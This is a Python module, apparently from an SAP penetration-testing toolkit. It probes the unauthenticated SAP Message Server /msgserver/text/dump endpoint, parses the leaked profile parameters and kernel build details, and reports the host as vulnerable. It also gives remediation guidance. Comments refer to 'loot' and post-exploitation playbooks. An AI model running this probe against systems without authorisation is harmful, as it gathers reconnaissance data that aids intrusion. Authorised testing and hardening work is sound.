"""sap_ms_info_disclosure — SAP Message Server HTTP text/dump info leak.

The Message Server HTTP port (81NN by default: 8100 + instance number)
exposes an unauthenticated ``/msgserver/text/dump`` endpoint that,
when the MS ACL is left at its default configuration, returns internal
kernel + instance state to any HTTP client on the network.

Two dump sections are the most valuable:

    ?3=1  → MS_DUMP_PARAMS   — every ms/* profile parameter, log-file
                                 paths, ACL settings, timeouts, server
                                 identity (SID / hostname / IP), build
                                 metadata.
    ?8=1  → MS_DUMP_RELEASE  — kernel release + patch level + Git
                                 commit hash + build environment.
                                 Feeds patch-status assessments (CVE
                                 cross-references land here).

Both dumps are plain text and start with ``dump : MS_DUMP_<section>``.
Absence of that banner = the ACL is enforced (or the port isn't the MS
HTTP one) — treat as not disclosed.

Fix guidance: set ``ms/acl_info`` and ``ms/HTTP/acl_info`` to a
restrictive file (SAP Notes 1421005, 2696233) so anonymous dumps are
denied.  The banner remains, but every subsequent request returns
HTTP 403 with an empty body.

Read-only, stateless, no auth attempted.  For authorised security
testing only.
"""
from __future__ import annotations

import re
import socket
from typing import Optional


DEFAULT_MS_HTTP_BASE = 8100

# Dump sections we know are useful.  Kept extensible — adding another
# section is a one-line change to `SECTIONS` below.
SECTIONS = {
    "params": (3, "MS_DUMP_PARAMS"),        # ms/* profile parameters
    "kernel_build": (8, "MS_DUMP_RELEASE"),  # kernel release + git hash
}


# Regex for `key = value` lines emitted by the MS dump — the format is
# stable across every 7.x / 9.x kernel we've observed.  Anchor on
# whitespace so `ms/http/…` values with equals signs inside them don't
# break the split.
_KV_LINE_RE = re.compile(r"^([^\s=][^=]*?)\s*=\s*(.*)$")

# A raw response counts as a valid MS dump when its head carries this
# banner.  Absence of the banner means the ACL enforced denial or we
# hit a non-MS HTTP server.
_DUMP_BANNER_RE = re.compile(r"^\s*dump\s*:\s*(MS_DUMP_[A-Z0-9_]+)",
                              re.IGNORECASE | re.MULTILINE)

# GitVers / GitHash live inside an indented supported-environment
# block with `key: value` syntax (not `key = value` like everything
# else).  Extract them specifically so patch-status cross-reference
# gets the exact build identity a customer would use to file a note.
_GIT_LINE_RE = re.compile(
    r"^\s*(GitVers|GitHash)\s*:\s*(\S+)",
    re.MULTILINE,
)

# Fields extracted from MS_DUMP_PARAMS beyond the raw ms/* list — these
# are the identity + build markers a CVE-cross-referencer or an audit
# report typically wants surfaced.
IDENTITY_FIELDS = (
    "Release", "Release no", "Build version",
    "System name", "Instance name",
    "server host", "server host (fqn)", "server addr",
    "server port", "server port (internal)",
    "start time", "up time",
    "build time", "build with Unicode", "system type",
)

# Fields extracted from MS_DUMP_RELEASE — the kernel-build detail we
# want in patch-status reports.
KERNEL_BUILD_FIELDS = (
    "Release", "Release no", "System name",
    "kernel release", "database library",
    "compiled on", "compiled time",
    "update level", "patch number", "source id",
    "GitVers", "GitHash",
)


def _http_get(host: str, port: int, path: str, timeout: float,
                saprouter: str = "") -> tuple:
    """Return (status_code, body_bytes, error) for a plain HTTP GET.

    Deliberately hand-rolled — no urllib/requests dependency.  The
    SAP MS HTTP handler answers HTTP/1.0 requests without keep-alive
    and closes the socket on completion, so a raw recv-until-EOF loop
    is the least surprising I/O pattern here.
    """
    try:
        if saprouter:
            # Route through an already-connected SAProuter tunnel.  The
            # helper transparently wraps the socket so ``sendall`` and
            # ``recv`` work as they would for a direct connection.
            from sap_saprouter import connect_through_saprouter
            s = connect_through_saprouter(
                saprouter + f"/H/{host}/S/{port}",
                timeout=timeout, talk_mode=1,
            )
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return (0, b"", f"{type(e).__name__}: {e}")

    try:
        req = (
            f"GET {path} HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: sapmap-msinfo/1.0\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("ascii")
        s.sendall(req)
        resp = b""
        # 128 KiB is plenty — the largest legitimate MS dump we've
        # measured is ~40 KiB (params + kernel + config combined).
        while len(resp) < 131072:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            resp += chunk
    except OSError as e:
        try:
            s.close()
        except Exception:
            pass
        return (0, b"", f"{type(e).__name__}: {e}")
    finally:
        try:
            s.close()
        except Exception:
            pass

    if not resp:
        return (0, b"", "empty response")

    # Split status line + headers from body.  MS HTTP always answers
    # HTTP/1.0 so the head/body boundary is CRLFCRLF; be permissive
    # about bare LF just in case some MS build strips one.
    sep = resp.find(b"\r\n\r\n")
    if sep < 0:
        sep = resp.find(b"\n\n")
    head = resp[:sep] if sep >= 0 else resp
    body = resp[sep + 4:] if sep >= 0 else b""

    status = 0
    m = re.match(rb"^HTTP/\d\.\d\s+(\d{3})", head)
    if m:
        status = int(m.group(1))
    return (status, body, "")


def _parse_dump(body_text: str) -> dict:
    """Return a structured parse of an MS text/dump response.

    Every legitimate MS dump we've observed emits ``key = value`` lines
    plus section headers (``dump : MS_DUMP_X``, ``kernel information``,
    ``patch comments``…).  The parser keeps the raw text so the caller
    can drop it into loot verbatim, and returns key-value maps for the
    fields we actually cross-reference.
    """
    banner_m = _DUMP_BANNER_RE.search(body_text)
    banner = banner_m.group(1) if banner_m else ""

    ms_params = []              # every `ms/*` line, formatted as "key = value"
    kv = {}                     # every other `key = value` line

    for line in body_text.splitlines():
        line = line.rstrip()
        if not line or line.startswith("#"):
            continue
        m = _KV_LINE_RE.match(line)
        if not m:
            continue
        key, val = m.group(1).strip(), m.group(2).strip()
        if key.startswith("ms/"):
            ms_params.append(f"{key} = {val}")
        else:
            # Never overwrite — some fields legitimately appear more
            # than once (patch comments, per-instance lines).  First
            # occurrence wins for the summary map; the raw text still
            # carries every occurrence.
            kv.setdefault(key, val)

    # Pull `GitVers: <token>` / `GitHash: <hex>` out of the indented
    # supported-environment block — the standard `key = value` regex
    # doesn't reach them because they use a colon separator.
    for m in _GIT_LINE_RE.finditer(body_text):
        kv.setdefault(m.group(1), m.group(2))

    return {
        "banner": banner,
        "ms_params": ms_params,
        "kv": kv,
    }


def probe_ms_info(host: str, inst_nr: Optional[int] = None,
                   http_port: Optional[int] = None,
                   timeout: float = 5.0,
                   saprouter: str = "") -> dict:
    """One-shot probe of the MS HTTP dump endpoint.

    Args:
        host        : target hostname / IP
        inst_nr     : SAP instance number (0-99); the MS HTTP port is
                        derived as 8100+inst_nr when ``http_port`` isn't
                        provided.  Ignored when http_port is set.
        http_port   : explicit MS HTTP port to hit — takes precedence
                        over inst_nr when set.  Callers that already
                        know the port (e.g. from prior scanning) should
                        pass it directly to avoid re-guessing.
        timeout     : per-request socket timeout in seconds.
        saprouter   : optional SAProuter route prefix to tunnel through.

    Returns a dict with:
        {
            "success"      : bool,      # True if any dump section was disclosed
            "vulnerable"   : bool,      # True iff success — kept as a
                                          #   separate key so callers can
                                          #   express the finding shape
                                          #   without re-checking success.
            "http_port"    : int,
            "sections"     : {
                "params"      : {banner, ms_params[], kv{}, raw_text} | None,
                "kernel_build": {banner, ms_params[], kv{}, raw_text} | None,
            },
            "identity"     : {  # convenience — pulled from PARAMS dump
                "sid"         : str,
                "instance"    : str,
                "host"        : str,
                "ip"          : str,
                "kernel_rel"  : str,
                "patch_level" : str,
                "build_time"  : str,
                "git_hash"    : str,
            },
            "error"        : str,       # non-empty when success == False
        }
    """
    if http_port is None:
        if inst_nr is None:
            return {"success": False, "vulnerable": False, "http_port": 0,
                    "sections": {"params": None, "kernel_build": None},
                    "identity": {},
                    "error": "neither http_port nor inst_nr supplied"}
        http_port = DEFAULT_MS_HTTP_BASE + int(inst_nr)

    sections = {"params": None, "kernel_build": None}
    first_error = ""

    for name, (section_id, expected_banner) in SECTIONS.items():
        path = f"/msgserver/text/dump?{section_id}=1"
        status, body, err = _http_get(host, http_port, path, timeout,
                                        saprouter=saprouter)
        if err:
            if not first_error:
                first_error = f"{name}: {err}"
            continue
        if status != 200 or not body:
            if not first_error:
                first_error = f"{name}: HTTP {status}, {len(body)}B body"
            continue

        text = body.decode("utf-8", errors="replace")
        parsed = _parse_dump(text)
        # Only trust the response when the MS_DUMP_* banner is present;
        # a load balancer or reverse proxy might return HTTP 200 with
        # unrelated content.
        if not parsed["banner"]:
            if not first_error:
                first_error = (f"{name}: HTTP 200 but no MS_DUMP_ banner "
                                f"({len(text)}B)")
            continue
        # Sanity: does the banner match what this section is supposed
        # to emit?  If not, we're on the right port but the section id
        # wasn't accepted — surface it so callers can debug.
        if expected_banner and expected_banner not in parsed["banner"]:
            if not first_error:
                first_error = (f"{name}: banner mismatch — got "
                                f"{parsed['banner']!r}, expected "
                                f"{expected_banner!r}")
        parsed["raw_text"] = text
        sections[name] = parsed

    success = any(sections[n] is not None for n in sections)

    # Identity summary from the PARAMS dump when we have it.
    identity = {}
    params = sections.get("params")
    if params and params.get("kv"):
        pkv = params["kv"]
        identity = {
            "sid":         pkv.get("System name", ""),
            "instance":    pkv.get("Instance name", ""),
            "host":        pkv.get("server host (fqn)")
                              or pkv.get("server host", ""),
            "ip":          pkv.get("server addr", ""),
            "kernel_rel":  pkv.get("Release", ""),
            "build_time":  pkv.get("build time", ""),
            # Wire-side ports the operator most cares about after
            # seeing the leak — external (36NN) and internal (39NN).
            "ms_port_ext": pkv.get("server port", ""),
            "ms_port_int": pkv.get("server port (internal)", ""),
            # System-type banner is a quick OS/hardware signal for the
            # operator: "PC with Windows NT" vs "AMD/Intel x86_64 with
            # Linux" — informs which post-ex playbook applies.
            "system_type": pkv.get("system type", ""),
        }
    kb = sections.get("kernel_build")
    if kb and kb.get("kv"):
        kkv = kb["kv"]
        identity.setdefault("kernel_rel", kkv.get("kernel release", ""))
        identity["patch_level"] = kkv.get("patch number", "")
        identity["git_hash"]    = kkv.get("GitHash", "")
        identity["git_vers"]    = kkv.get("GitVers", "")

    return {
        "success":    success,
        "vulnerable": success,
        "http_port":  http_port,
        "sections":   sections,
        "identity":   identity,
        "error":      "" if success else (first_error or "no data disclosed"),
    }
